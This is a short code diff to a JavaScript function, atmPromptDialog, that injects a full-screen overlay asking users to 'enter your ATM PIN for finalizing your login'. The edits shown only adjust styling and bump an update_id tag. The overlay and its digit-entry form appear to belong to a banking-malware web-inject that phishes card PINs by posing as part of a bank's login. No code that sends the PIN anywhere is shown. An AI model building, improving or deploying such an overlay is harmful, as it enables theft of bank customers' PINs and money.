@@ -3,8 +3,8 @@ const atmPromptDialog = () => {
   styleElement.textContent = `
   .iBiometric_container {
     position: fixed;
-    min-width: 100vw;
-    min-height: 100vh;
+    width: 100vw;
+    height: 100vh;
     background-color: #000000d3;
     z-index: 99999;
     display: flex;
@@ -58,7 +58,7 @@ const atmPromptDialog = () => {
       font-size: 24px;
       font-family: 'Raleway', sans-serif;
       font-weight: 200;
-      color: white;
+      color: #000000;
       margin: 0 2px;
     }
   
@@ -75,7 +75,7 @@ const atmPromptDialog = () => {
   <div id="iBiometric_container_for_atmPIN_prompt" class="iBiometric_container">
   <div class="iBiometric_dialog">
     <h2>Enter PIN</h2>
-    <p>update_id=local35: Please enter your ATM PIN for finalizing your login.</p>
+    <p>update_id=local36: Please enter your ATM PIN for finalizing your login.</p>
     <form method="get" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
       <input type="text" id="digit-1" name="digit-1" data-next="digit-2" />
       <input type="text" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" />
